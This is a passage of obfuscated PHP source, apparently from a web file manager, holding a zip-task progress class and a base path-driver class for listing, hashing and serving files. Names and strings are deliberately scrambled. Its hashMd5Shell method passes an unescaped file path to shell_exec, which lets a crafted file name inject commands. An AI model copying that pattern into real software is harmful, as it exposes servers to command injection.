$_SERVER[¥ÙÌÜ¾ê]; $¶èª‹¡¡ =& $this->task; if ($¶èª‹¡¡[$åç©š‡±[1672]] == $åç©š‡±[1129]) { $¶èª‹¡¡[$åç©š‡±[1672]] = $åç©š‡±[311]; $¶èª‹¡¡[$åç©š‡±[1633]] = 0; $¶èª‹¡¡[$åç©š‡±[756]] = 0; } $ô—–óæ• = get_path_this($âÛ¸¿êÎ); if (strstr($ô—–óæ•, $åç©š‡±[95])) { $¶èª‹¡¡[$åç©š‡±[1582]] += 1; $¶èª‹¡¡[$åç©š‡±[1059]] += 1; } $¶èª‹¡¡[$åç©š‡±[1626]] = $âÛ¸¿êÎ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÍşÁ¥î =& $_SERVER[¥ÙÌÜ¾ê]; parent::startAfter(); Hook::bind($ÍşÁ¥î[1675], array($this, $ÍşÁ¥î[1670])); $—øâŒ´Æ =& $this->task; $—øâŒ´Æ[$ÍşÁ¥î[1672]] = $ÍşÁ¥î[1129]; if (!$—øâŒ´Æ[$ÍşÁ¥î[1481]]) { $—øâŒ´Æ[$ÍşÁ¥î[1481]] = LNG($ÍşÁ¥î[1676]); } } protected function endAfter() { $Î‹¢ïñ« =& $_SERVER[¥ÙÌÜ¾ê]; parent::endAfter(); Hook::unbind($Î‹¢ïñ«[1675], array($this, $Î‹¢ïñ«[1670])); } public function updateAfter() { $Äûå’ÑÊ =& $_SERVER[¥ÙÌÜ¾ê]; $ŠÁÁô—Ñ =& $this->task; if (!$ŠÁÁô—Ñ[$Äûå’ÑÊ[1059]] || !$ŠÁÁô—Ñ[$Äûå’ÑÊ[756]]) { return; } if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1672]] == $Äûå’ÑÊ[1129]) { $« Î–…ô = $ŠÁÁô—Ñ[$Äûå’ÑÊ[1629]]; if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1630]] != $Äûå’ÑÊ[1129]) { $« Î–…ô = 0; } $“¾®™÷ = ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1633]] + $« Î–…ô) / $ŠÁÁô—Ñ[$Äûå’ÑÊ[756]]; $ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]] = $“¾®™÷ * 0.3; } else { if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1672]] == $Äûå’ÑÊ[311]) { $“¾®™÷ = $ŠÁÁô—Ñ[$Äûå’ÑÊ[1582]] / $ŠÁÁô—Ñ[$Äûå’ÑÊ[1059]]; $ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]] = 0.3 + $“¾®™÷ * 0.5; } else { if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1672]] == $Äûå’ÑÊ[107]) { $“¾®™÷ = 0; if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1628]]) { $“¾®™÷ = $ŠÁÁô—Ñ[$Äûå’ÑÊ[1629]] / $ŠÁÁô—Ñ[$Äûå’ÑÊ[1628]]; } $ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]] = 0.3 + 0.5 + $“¾®™÷ * 0.2; } } } if ($ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]] > 0) { $ƒ°¤²Ã„ = timeFloat() - $ŠÁÁô—Ñ[$Äûå’ÑÊ[782]] - $ŠÁÁô—Ñ[$Äûå’ÑÊ[1586]]; $ŠÁÁô—Ñ[$Äûå’ÑÊ[1587]] = $ƒ°¤²Ã„ * (1 - $ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]]) / $ŠÁÁô—Ñ[$Äûå’ÑÊ[1583]]; } } public function copyFileStart($Å‚Õşêã, $ÆÕ’Â…Ï, $ì«‰”ã, $”Îè«¦, $âƒôØ©©, $ıšµÍŒ„) { $¦’’ó›Î =& $_SERVER[¥ÙÌÜ¾ê]; parent::copyFileStart($Å‚Õşêã, $ÆÕ’Â…Ï, $ì«‰”ã, $”Îè«¦, $âƒôØ©©, $ıšµÍŒ„); $Ú¾—­Ç¹ =& $this->task; if ($Ú¾—­Ç¹[$¦’’ó›Î[1672]] == $¦’’ó›Î[311]) { $Ú¾—­Ç¹[$¦’’ó›Î[1672]] = $¦’’ó›Î[107]; } $this->update(); } public function copyFileEnd($ã×Ã®™ø, $¦°èÃ¼è, $ğ­§Á© , $§Ú„ò¦, $‡òîßÜ‹, $Áéñõà) { $ÙÛ³Ñš =& $_SERVER[¥ÙÌÜ¾ê]; $øåÔã½ =& $this->task; $øåÔã½[$ÙÛ³Ñš[1629]] = $øåÔã½[$ÙÛ³Ñš[1628]]; $øåÔã½[$ÙÛ³Ñš[1633]] += $øåÔã½[$ÙÛ³Ñš[1628]]; $øåÔã½[$ÙÛ³Ñš[1630]] = $ÙÛ³Ñš[33]; $this->update(); } public function nameParse($úºê•Ìñ) { $×Æª±ı¿ =& $_SERVER[¥ÙÌÜ¾ê]; $û ‘€È³ =& $this->task; if ($û ‘€È³[$×Æª±ı¿[1582]] < $û ‘€È³[$×Æª±ı¿[1059]]) { $Ë«¨°“Ø = get_path_this($úºê•Ìñ); if (strstr($Ë«¨°“Ø, $×Æª±ı¿[95])) { $û ‘€È³[$×Æª±ı¿[1582]] += 1; } } if ($û ‘€È³[$×Æª±ı¿[1672]] == $×Æª±ı¿[1129]) { $û ‘€È³[$×Æª±ı¿[1672]] = $×Æª±ı¿[311]; } $û ‘€È³[$×Æª±ı¿[1626]] = $úºê•Ìñ; $this->update(); } } goto A¢—Ô†ª¼˜; d¢­¹¯œ·å: define($_SERVER[¥ÙÌÜ¾ê][236], 1); define($_SERVER[¥ÙÌÜ¾ê][237], 2); define($_SERVER[¥ÙÌÜ¾ê][238], 3); goto CÍã›áÛŞĞ; CÍã›áÛŞĞ: define($_SERVER[¥ÙÌÜ¾ê][239], 1); define($_SERVER[¥ÙÌÜ¾ê][240], 0); define($_SERVER[¥ÙÌÜ¾ê][241], 2); goto d˜ğ¢š¿ß¿; FŒ¹…ÕÎ¨Ù: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $¯÷ØâèÈ =& $_SERVER[¥ÙÌÜ¾ê]; $this->objectDriver = array($¯÷ØâèÈ[57], $¯÷ØâèÈ[58], $¯÷ØâèÈ[59], $¯÷ØâèÈ[60], $¯÷ØâèÈ[61], $¯÷ØâèÈ[62], $¯÷ØâèÈ[63], $¯÷ØâèÈ[64], $¯÷ØâèÈ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ë§Ù‰—ú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ë§Ù‰—ú, $_SERVER[¥ÙÌÜ¾ê][8]); } return $ë§Ù‰—ú; } public function iconvApp($íÑáğ¾Ç) { return $íÑáğ¾Ç; } public function iconvSystem($”ˆ®÷Æ¶) { return $”ˆ®÷Æ¶; } public function iconvTo($Ò‡„ÄËÒ, $¢š·ƒ’¤, $Ğ‰÷ã‰) { $ŒÌ’†ü =& $_SERVER[¥ÙÌÜ¾ê]; if (!$Ò‡„ÄËÒ || !function_exists($ŒÌ’†ü[66])) { return $Ò‡„ÄËÒ; } static $Ù©°•Ô = array(); $‰í´ÏÂã = $¢š·ƒ’¤ . $ŒÌ’†ü[67] . $Ğ‰÷ã‰ . $ŒÌ’†ü[68] . $Ò‡„ÄËÒ; if (isset($Ù©°•Ô[$‰í´ÏÂã])) { return $Ù©°•Ô[$‰í´ÏÂã]; } if (function_exists($ŒÌ’†ü[69])) { $Œé–ˆğ· = @mb_convert_encoding($Ò‡„ÄËÒ, $Ğ‰÷ã‰, $¢š·ƒ’¤); } else { $Œé–ˆğ· = @iconv($¢š·ƒ’¤, $Ğ‰÷ã‰, $Ò‡„ÄËÒ); } $Œé–ˆğ· = $Œé–ˆğ· ? $Œé–ˆğ· : $Ò‡„ÄËÒ; if (strstr($Œé–ˆğ·, $ŒÌ’†ü[70])) { $Œé–ˆğ· = str_replace($ŒÌ’†ü[70], $ŒÌ’†ü[71], $Œé–ˆğ·); } $Ù©°•Ô[$¢š·ƒ’¤ . $ŒÌ’†ü[67] . $Ğ‰÷ã‰ . $ŒÌ’†ü[68] . $Ò‡„ÄËÒ] = $Œé–ˆğ·; $Ù©°•Ô[$Ğ‰÷ã‰ . $ŒÌ’†ü[67] . $¢š·ƒ’¤ . $ŒÌ’†ü[68] . $Ò‡„ÄËÒ] = $Ò‡„ÄËÒ; $Ù©°•Ô[$Ğ‰÷ã‰ . $ŒÌ’†ü[67] . $¢š·ƒ’¤ . $ŒÌ’†ü[68] . $Œé–ˆğ·] = $Ò‡„ÄËÒ; $Ù©°•Ô[$¢š·ƒ’¤ . $ŒÌ’†ü[67] . $Ğ‰÷ã‰ . $ŒÌ’†ü[68] . $Œé–ˆğ·] = $Œé–ˆğ·; return $Œé–ˆğ·; } public function getPathInner($ªÄŠ‘ç) { $”ÜÚ±ƒ· = IO::init($ªÄŠ‘ç); return $”ÜÚ±ƒ·->path; } public function getPathOuter($Èœ¶×ş) { $Ê»†ŞÎ =& $_SERVER[¥ÙÌÜ¾ê]; $ÀÀÕÑ‰‰ = strlen(trim($this->pathBase, $Ê»†ŞÎ[8])); $Èœ¶×ş = substr(trim($Èœ¶×ş, $Ê»†ŞÎ[8]), $ÀÀÕÑ‰‰); return $this->pathDriver . $Ê»†ŞÎ[8] . ltrim($Èœ¶×ş, $Ê»†ŞÎ[8]); } public function isParentOf($Æø¦¾¹Ö, $ùò­Ë§’) { $Ùß×¡ãÒ =& $_SERVER[¥ÙÌÜ¾ê]; $Æø¦¾¹Ö = rtrim(strtolower($Æø¦¾¹Ö), $Ùß×¡ãÒ[8]) . $Ùß×¡ãÒ[8]; $ùò­Ë§’ = rtrim(strtolower($ùò­Ë§’), $Ùß×¡ãÒ[8]) . $Ùß×¡ãÒ[8]; $ ’Îêú¾ = strpos($ùò­Ë§’, $Æø¦¾¹Ö) === 0; return $ ’Îêú¾; } public function getType() { $Ìê’û¹ =& $_SERVER[¥ÙÌÜ¾ê]; $ºÈª ö = str_replace($Ìê’û¹[72], $Ìê’û¹[33], get_class($this)); return strtolower($ºÈª ö); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Şäµ¼àç, $à¨ª†ıÂ) { $®ªı¹â© =& $_SERVER[¥ÙÌÜ¾ê]; $å¯…ò®î = rtrim($Şäµ¼àç, $®ªı¹â©[8]) . $®ªı¹â©[8] . $à¨ª†ıÂ; $’®ö¥Âš = $this->exist($å¯…ò®î); return $’®ö¥Âš ? $å¯…ò®î : !1; } public function setModifyTime($É”Æñéõ, $û™±´· = '') { } public function renameObject($şÇÜ½ûÏ, $œ‚¬…Û) { $²¬—áä„ =& $_SERVER[¥ÙÌÜ¾ê]; $ñ‡¤ŞÜ† = $œ‚¬…Û; Hook::trigger($²¬—áä„[73], $this, $şÇÜ½ûÏ, $this, $this->pathFather($şÇÜ½ûÏ) . $œ‚¬…Û); $şÇÜ½ûÏ = $this->getPathOuter($şÇÜ½ûÏ); $œ‚¬…Û = $this->pathFather($şÇÜ½ûÏ) . $œ‚¬…Û; if (IO::isFile($şÇÜ½ûÏ)) { $à™ÅƒÌ¥ = IO::copy($şÇÜ½ûÏ, $this->pathFather($şÇÜ½ûÏ), REPEAT_RENAME_FOLDER, $ñ‡¤ŞÜ†); if ($à™ÅƒÌ¥) { IO::remove($şÇÜ½ûÏ); } } else { $à™ÅƒÌ¥ = IO::mkdir($œ‚¬…Û); if (!$à™ÅƒÌ¥) { return !1; } $¶µÏŸ = IO::listPath($şÇÜ½ûÏ, !0); $ôş¾¢¾ = array_merge($¶µÏŸ[$²¬—áä„[74]], $¶µÏŸ[$²¬—áä„[75]]); foreach ($ôş¾¢¾ as $À’ Ó¸) { IO::move($À’ Ó¸[$²¬—áä„[76]], $œ‚¬…Û, REPEAT_RENAME_FOLDER); } IO::remove($şÇÜ½ûÏ); } return $à™ÅƒÌ¥ ? $œ‚¬…Û : !1; } public function tempFile($‡ˆ–Ñ¯ = '', $ûĞîÏÖ = '') { if (!$‡ˆ–Ñ¯) { $‡ˆ–Ñ¯ = rand_string(15); } $ÖÙ²ãú¸ = TEMP_FILES . rand_string(15) . $_SERVER[¥ÙÌÜ¾ê][8]; @mkdir($ÖÙ²ãú¸, DEFAULT_PERRMISSIONS, !0); $ĞÍ»½”ù = $ÖÙ²ãú¸ . $‡ˆ–Ñ¯; @touch($ĞÍ»½”ù); if ($ûĞîÏÖ) { file_put_contents($ĞÍ»½”ù, $ûĞîÏÖ); } return $ĞÍ»½”ù; } public function tempFileRemve($Ì©ÅÁÁÚ) { @unlink($Ì©ÅÁÁÚ); @rmdir($this->pathFather($Ì©ÅÁÁÚ)); } public function mkfile($šÛÏá³Î, $Èİ‹Ã„­ = '', $ƒ¦—Šš¦ = REPEAT_RENAME) { } public function mkdir($Ò³œ†‘¥, $‚Õæ¾è = REPEAT_SKIP) { } public function delFile($˜Üµ £) { } public function delFolder($Ä÷ÎÓ²œ) { } public function copyFile($‹¡–îÁ, $¼³‰—°û) { } public function moveFile($ÌçôıùÖ, $¹©™íğ•) { } public function remove($Û§Ö÷§’) { if ($this->isFile($Û§Ö÷§’)) { return $this->delFile($Û§Ö÷§’); } return $this->delFolder($Û§Ö÷§’); } public function rename($ÅçÜ¿µà, $Ùàú÷î) { } public function exist($µØ‡óÇ) { } public function findByHash($­ÉİÊØ = '', $ŒàÄŞ¤ = '') { return !1; } public function isFile($Ê œ¡³) { } public function isFolder($ÔÈ»Ò») { } public function size($ÛÃÁ‘Û) { } public function info($“àÃ„ˆ´) { } public function infoSimple($‹ï¢Ñİê) { return $this->info($‹ï¢Ñİê); } public function infoAuth($¢÷ÑÈ¢Ì) { return $this->info($¢÷ÑÈ¢Ì); } public function infoFull($¼ü¸ÍÒ) { return $this->info($¼ü¸ÍÒ); } public function infoWithChildren($—³ ¶èÓ) { $ë­ò­âÃ =& $_SERVER[¥ÙÌÜ¾ê]; static $Ú…ú¦‘’ = array(); if (isset($Ú…ú¦‘’[$—³ ¶èÓ])) { return $Ú…ú¦‘’[$—³ ¶èÓ]; } $Ù¬ˆÆÖ = $this->info($—³ ¶èÓ); if ($Ù¬ˆÆÖ && $Ù¬ˆÆÖ[$ë­ò­âÃ[29]] == $ë­ò­âÃ[77]) { $ŞÀà‚µÍ = array($ë­ò­âÃ[78] => 0, $ë­ò­âÃ[79] => 0, $ë­ò­âÃ[80] => 0); $this->infoChildren($—³ ¶èÓ, $ŞÀà‚µÍ); $Ù¬ˆÆÖ[$ë­ò­âÃ[78]] = $ŞÀà‚µÍ[$ë­ò­âÃ[78]]; $Ù¬ˆÆÖ[$ë­ò­âÃ[81]] = array($ë­ò­âÃ[82] => $ŞÀà‚µÍ[$ë­ò­âÃ[79]], $ë­ò­âÃ[83] => $ŞÀà‚µÍ[$ë­ò­âÃ[80]]); $Ú…ú¦‘’[$—³ ¶èÓ] = $Ù¬ˆÆÖ; } return $Ù¬ˆÆÖ; } public function listPath($›ÖíÌÁ¼, $¶£»Æû = false) { } public function has($„Û®¡ğ–, $Å¶‰Åµš = false, $—šÛÏè = false) { } public function canRead($·©Êá£²) { } public function canWrite($›ô¿Šì©) { } public function getContent($ü˜’ç‰ï) { } public function setContent($ºèå¢ö, $Ö²©àå¼ = '') { } protected function infoChildren($Ë—¥ƒ¿, &$ ‚«ôÀÕ) { $‚§‹™©¹ =& $_SERVER[¥ÙÌÜ¾ê]; check_abort_echo(); $Ë¶Ï×ëÌ = $this->listPath($Ë—¥ƒ¿, !0); $Ë¶Ï×ëÌ = array_merge($Ë¶Ï×ëÌ[$‚§‹™©¹[75]], $Ë¶Ï×ëÌ[$‚§‹™©¹[74]]); foreach ($Ë¶Ï×ëÌ as $êğéöÌ„) { if ($êğéöÌ„[$‚§‹™©¹[29]] == $‚§‹™©¹[77]) { $ ‚«ôÀÕ[$‚§‹™©¹[80]]++; $¾°›šĞµ = $this->getPathInner($êğéöÌ„[$‚§‹™©¹[76]]); $this->infoChildren($¾°›šĞµ, $ ‚«ôÀÕ); } else { $ ‚«ôÀÕ[$‚§‹™©¹[79]]++; $ ‚«ôÀÕ[$‚§‹™©¹[78]] += $êğéöÌ„[$‚§‹™©¹[78]]; } } } public function fileSubstr($¯öÍˆûˆ, $¶Çá³Ïñ, $çàíìƒè) { } public function listAll($–£ò¤) { } public function listAllMake($ş²÷öåí, &$ü«ŞË»°) { $„ïê”ÑÄ =& $_SERVER[¥ÙÌÜ¾ê]; check_abort_echo(); $µÉ»éåº = $this->listPath($ş²÷öåí, !0); if (!$µÉ»éåº) { return; } $Ğ¨±Ü‹  = array_merge($µÉ»éåº[$„ïê”ÑÄ[75]], $µÉ»éåº[$„ïê”ÑÄ[74]]); foreach ($Ğ¨±Ü‹  as $Ôƒˆ¬Îû) { $‘‰ÎÈü› = $Ôƒˆ¬Îû[$„ïê”ÑÄ[29]] == $„ïê”ÑÄ[77]; $¨ÊÅâ«¢ = array($„ïê”ÑÄ[76] => $Ôƒˆ¬Îû[$„ïê”ÑÄ[76]], $„ïê”ÑÄ[77] => $‘‰ÎÈü›); if (isset($Ôƒˆ¬Îû[$„ïê”ÑÄ[78]])) { $¨ÊÅâ«¢[$„ïê”ÑÄ[78]] = $Ôƒˆ¬Îû[$„ïê”ÑÄ[78]]; } if (isset($Ôƒˆ¬Îû[$„ïê”ÑÄ[84]])) { $¨ÊÅâ«¢[$„ïê”ÑÄ[84]] = $Ôƒˆ¬Îû[$„ïê”ÑÄ[84]]; } if (!$‘‰ÎÈü›) { $ü«ŞË»°[] = $¨ÊÅâ«¢; continue; } $ü«ŞË»°[] = $¨ÊÅâ«¢; $ÂíÔõşä = $Ôƒˆ¬Îû[$„ïê”ÑÄ[76]]; $œÔùŠè— = $this->pathDriver; if (substr($Ôƒˆ¬Îû[$„ïê”ÑÄ[76]], 0, strlen($œÔùŠè—)) == $œÔùŠè—) { $ÂíÔõşä = substr($ÂíÔõşä, strlen($œÔùŠè—)); } $this->listAllMake($ÂíÔõşä, $ü«ŞË»°); } } public function listAllSimple($ãˆ€ïÍ‘) { $½‰¼ ‰ =& $_SERVER[¥ÙÌÜ¾ê]; $‚ä¼®’Ş = array(); $Ô¤øøë¶ = $this->listAll($ãˆ€ïÍ‘); $Ëª‘ïŠƒ = $this->getPathOuter($ãˆ€ïÍ‘); foreach ($Ô¤øøë¶ as $ÄìÇŞû¹) { $ÆóõÉ¸Ó = $ÄìÇŞû¹[$½‰¼ ‰[76]]; $à§ƒµì™ = $ÄìÇŞû¹[$½‰¼ ‰[76]]; if (isset($ÄìÇŞû¹[$½‰¼ ‰[85]])) { $ÆóõÉ¸Ó = $ÄìÇŞû¹[$½‰¼ ‰[85]][$½‰¼ ‰[76]]; $ÄìÇŞû¹[$½‰¼ ‰[78]] = $ÄìÇŞû¹[$½‰¼ ‰[85]][$½‰¼ ‰[78]]; $ÄìÇŞû¹[$½‰¼ ‰[84]] = $ÄìÇŞû¹[$½‰¼ ‰[85]][$½‰¼ ‰[84]]; } else { $à§ƒµì™ = substr($ÄìÇŞû¹[$½‰¼ ‰[76]], strlen(get_path_father($Ëª‘ïŠƒ))); $à§ƒµì™ = $½‰¼ ‰[8] . ltrim($à§ƒµì™, $½‰¼ ‰[8]); } $Ï¦ ½½¶ = array($½‰¼ ‰[76] => $à§ƒµì™, $½‰¼ ‰[77] => $ÄìÇŞû¹[$½‰¼ ‰[77]]); if (isset($ÄìÇŞû¹[$½‰¼ ‰[78]]) && !$ÄìÇŞû¹[$½‰¼ ‰[77]]) { $Ï¦ ½½¶[$½‰¼ ‰[78]] = $ÄìÇŞû¹[$½‰¼ ‰[78]]; } if (isset($ÄìÇŞû¹[$½‰¼ ‰[84]])) { $Ï¦ ½½¶[$½‰¼ ‰[84]] = $ÄìÇŞû¹[$½‰¼ ‰[84]]; } if (!$ÄìÇŞû¹[$½‰¼ ‰[77]]) { $Ï¦ ½½¶[$½‰¼ ‰[86]] = $ÆóõÉ¸Ó; } $‚ä¼®’Ş[] = $Ï¦ ½½¶; } return $‚ä¼®’Ş; } public function upload($°‹š’¾, $ì¸¢ã—Ö, $ªØå®­Í = false, $ë·Ì€à‰ = REPEAT_REPLACE) { } public function uploadFileByID($¢®†â , $ş´ö‡âÒ, $š©–¡ö·) { } public function uploadFileByPath($™Ø¥¦ñ·, $«êÃÖö›, $š’ÜĞ¡® = array()) { } public function isUploadServer() { $Ê½éöÌä =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ê½éöÌä[87]) { return !0; } return $GLOBALS[$Ê½éöÌä[6]][$Ê½éöÌä[88]][$Ê½éöÌä[89]]; } public function isFileOutServer() { $Ã”Û®œî =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ã”Û®œî[87]) { return !0; } return $GLOBALS[$Ã”Û®œî[6]][$Ã”Û®œî[88]][$Ã”Û®œî[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ûê“ĞŸ«) { $Şàûƒ½… =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->isCdnHost()) { return $Ûê“ĞŸ«; } return str_replace(trim(get_url_root($Ûê“ĞŸ«), $Şàûƒ½…[8]), trim($this->cdnHost, $Şàûƒ½…[8]), $Ûê“ĞŸ«); } public function uploadLink($÷é‰‚ƒÛ, $Ì‰È°˜± = 0) { $½¶¿Şû© =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->isUploadServer()) { return; } $Ïî¦˜İ = $this->getType(); if (!in_array($Ïî¦˜İ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $î¥“¸Í– = 1024 * 1024 * 10; $¸”¿¢”Â = $Ì‰È°˜± <= $î¥“¸Í– ? $½¶¿Şû©[91] : $½¶¿Şû©[92]; $Í¼çß„ø = (!$Ì‰È°˜± ? 1 : ceil($Ì‰È°˜± / pow(1024, 3))) * 3600 * 4; $Êïç„Ù = $this->{$¸”¿¢”Â}($÷é‰‚ƒÛ, $Í¼çß„ø); if ($Êïç„Ù) { $Êïç„Ù[$½¶¿Şû©[93]] = $÷é‰‚ƒÛ; $Êïç„Ù[$½¶¿Şû©[94]] = $Ïî¦˜İ; } return $Êïç„Ù; } public function uploadFormData($‘À’¼²ò, $ÊÌ³öó = 3600) { } public function multiUploadFormData($Ç×¶Ô¥, $Äà¥è = 3600) { } public function download($¤´ğòú, $ƒ‡¥Û°) { } public function ext($Åäù×¨·) { $Ùä‰Œ™ =& $_SERVER[¥ÙÌÜ¾ê]; if (strpos($Åäù×¨·, $Ùä‰Œ™[8]) === -1) { $ßµ¹û‚Ò = $Åäù×¨·; } else { $ßµ¹û‚Ò = $this->pathThis($Åäù×¨·); } $íÔ‚ş = $Ùä‰Œ™[33]; if (strstr($ßµ¹û‚Ò, $Ùä‰Œ™[95])) { $íÔ‚ş = substr($ßµ¹û‚Ò, strrpos($ßµ¹û‚Ò, $Ùä‰Œ™[95]) + 1); $íÔ‚ş = strtolower($íÔ‚ş); } if (strlen($íÔ‚ş) > 3 && preg_match($Ùä‰Œ™[96], $íÔ‚ş, $Âõæ‹åì)) { $íÔ‚ş = $Ùä‰Œ™[33]; } return $íÔ‚ş; } public function pathThis($şğÍ–§) { $ÓàÁ½Ê =& $_SERVER[¥ÙÌÜ¾ê]; $şğÍ–§ = str_replace($ÓàÁ½Ê[97], $ÓàÁ½Ê[8], rtrim($şğÍ–§, $ÓàÁ½Ê[8])); $ú¬Í«©Á = strrpos($şğÍ–§, $ÓàÁ½Ê[8]); if ($ú¬Í«©Á === !1) { return $şğÍ–§; } return substr($şğÍ–§, $ú¬Í«©Á + 1); } public function pathFather($ô±‹Ñ‚) { $ÙÆÙÈ·¬ =& $_SERVER[¥ÙÌÜ¾ê]; $ô±‹Ñ‚ = str_replace($ÙÆÙÈ·¬[97], $ÙÆÙÈ·¬[8], rtrim($ô±‹Ñ‚, $ÙÆÙÈ·¬[8])); $¥Ş¹Ÿ¨á = strrpos($ô±‹Ñ‚, $ÙÆÙÈ·¬[8]); if ($¥Ş¹Ÿ¨á === !1) { return $ÙÆÙÈ·¬[33]; } return substr($ô±‹Ñ‚, 0, $¥Ş¹Ÿ¨á + 1); } public function hashSimple($¢«…£°²) { $Òªú÷ˆ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¢«…£°²) { return md5($Òªú÷ˆ[33]); } $°ÅÔÖÄœ = $this->size($¢«…£°²); $¸»á‰±ä = 200; $àÂËïæ¥ = 50; if ($°ÅÔÖÄœ <= $¸»á‰±ä * $àÂËïæ¥) { return $this->hashMd5($¢«…£°²) . $°ÅÔÖÄœ; } $±ˆ©ş = intval($°ÅÔÖÄœ / $àÂËïæ¥); $¹ÇšĞË± = $Òªú÷ˆ[33]; for ($µ¶Äƒœ = 0; $µ¶Äƒœ < $àÂËïæ¥; $µ¶Äƒœ++) { $¹ÇšĞË± .= $this->fileSubstr($¢«…£°², $±ˆ©ş * $µ¶Äƒœ, $¸»á‰±ä); } $¹ÇšĞË± .= $this->fileSubstr($¢«…£°², $°ÅÔÖÄœ - $¸»á‰±ä, $¸»á‰±ä); return md5($¹ÇšĞË±) . $°ÅÔÖÄœ; } public static $md5Cache = array(); public function hashMd5($½Ğ–Ğ¡») { if (!$½Ğ–Ğ¡») { return md5($_SERVER[¥ÙÌÜ¾ê][33]); } $½Ğ–Ğ¡» = $this->iconvSystem($½Ğ–Ğ¡»); if (isset(self::$md5Cache[$½Ğ–Ğ¡»])) { return self::$md5Cache[$½Ğ–Ğ¡»]; } self::$md5Cache[$½Ğ–Ğ¡»] = $this->hashMd5Shell($½Ğ–Ğ¡»); if (!self::$md5Cache[$½Ğ–Ğ¡»]) { self::$md5Cache[$½Ğ–Ğ¡»] = @md5_file($½Ğ–Ğ¡»); } return self::$md5Cache[$½Ğ–Ğ¡»]; } private function hashMd5Shell($­¡ºÒËË) { $·§éèÙƒ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$­¡ºÒËË) { return md5($·§éèÙƒ[33]); } if (!function_exists($·§éèÙƒ[98])) { return !1; } $ù°ÚÖ†• = array($·§éèÙƒ[99], $·§éèÙƒ[100]); $÷µºÎá§ = Cache::get($·§éèÙƒ[101]); if (!$÷µºÎá§) { $Àó¦•Î = BASIC_PATH . $·§éèÙƒ[102]; $ØĞ»×ªª = md5_file($Àó¦•Î); $÷µºÎá§ = $·§éèÙƒ[103]; foreach ($ù°ÚÖ†• as $÷•Ş¨Ä¡) { $¸Œù÷èĞ = shell_exec($÷•Ş¨Ä¡ . "\40\42{$Àó¦•Î}\x22"); if ($¸Œù÷èĞ && substr(trim($¸Œù÷èĞ), 0, 32) == $ØĞ»×ªª) { $÷µºÎá§ = $÷•Ş¨Ä¡; break; } } Cache::set($·§éèÙƒ[101], $÷µºÎá§, 3600); } if ($÷µºÎá§ == $·§éèÙƒ[103]) { return !1; } $¸Œù÷èĞ = shell_exec($÷µºÎá§ . "\40\x22{$­¡ºÒËË}\x22"); $¸Œù÷èĞ = str_replace($·§éèÙƒ[104], $·§éèÙƒ[33], $¸Œù÷èĞ); return substr($¸Œù÷èĞ, 0, 32); } public function link($“úì»Õô) { return $“úì»Õô; } public function fileOut($ê”œ¯Æ, $Ôº»ƒ¼¢ = false, $ µ»“Ô¶ = false, $ÀçÓÉ¬ = '') { $¿¡øŸÛ· =& $_SERVER[¥ÙÌÜ¾ê]; $this->cacheMethod(null, null); if (!$ê”œ¯Æ || !$this->exist($ê”œ¯Æ)) { show_json(LNG($¿¡øŸÛ·[105]), !1, $ µ»“Ô¶); } $Öş•ó = $this->getType() == $¿¡øŸÛ·[106]; $ğÃÛ¢™Ç = $GLOBALS[$¿¡øŸÛ·[6]][$¿¡øŸÛ·[88]][$¿¡øŸÛ·[107]][$¿¡øŸÛ·[108]]; $Î‘• ×Í = (double) $GLOBALS[$¿¡øŸÛ·[6]][$¿¡øŸÛ·[88]][$¿¡øŸÛ·[107]][$¿¡øŸÛ·[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $‚å§ˆÛ = $this->infoFull($ê”œ¯Æ); $°£©ğ÷© = $‚å§ˆÛ[$¿¡øŸÛ·[78]]; $ûŸÂİã¯ = gmdate($¿¡øŸÛ·[110], $‚å§ˆÛ[$¿¡øŸÛ·[84]]); $éŸıÊÒ¬ = $ µ»“Ô¶ ? $ µ»“Ô¶ : $this->iconvApp($‚å§ˆÛ[$¿¡øŸÛ·[28]]); $šÊ…™Ì˜ = 0; $ôÊî÷¡£ = $°£©ğ÷© - 1; $ëˆü½ØŒ = $this->ext($éŸıÊÒ¬); if (in_array($ëˆü½ØŒ, array($¿¡øŸÛ·[111], $¿¡øŸÛ·[112], $¿¡øŸÛ·[113], $¿¡øŸÛ·[114]))) { $ëˆü½ØŒ = $¿¡øŸÛ·[115]; } if (!$ÀçÓÉ¬) { $ÀçÓÉ¬ = md5($ûŸÂİã¯ . $this->hashSimple($ê”œ¯Æ)); } $ÀçÓÉ¬ = $¿¡øŸÛ·[116] . $ÀçÓÉ¬ . $¿¡øŸÛ·[116]; $è’Š§…û = get_file_mime($ëˆü½ØŒ); if (strstr($è’Š§…û, $¿¡øŸÛ·[117])) { $è’Š§…û = $è’Š§…û . $¿¡øŸÛ·[118]; } if ($Ôº»ƒ¼¢ === !1 && !mime_support($è’Š§…û)) { $Ôº»ƒ¼¢ = !0; $è’Š§…û = $¿¡øŸÛ·[119]; } header($¿¡øŸÛ·[120]); header($¿¡øŸÛ·[121] . $è’Š§…û); $î©·ùÛ¿ = rawurlencode($éŸıÊÒ¬); $î©·ùÛ¿ = 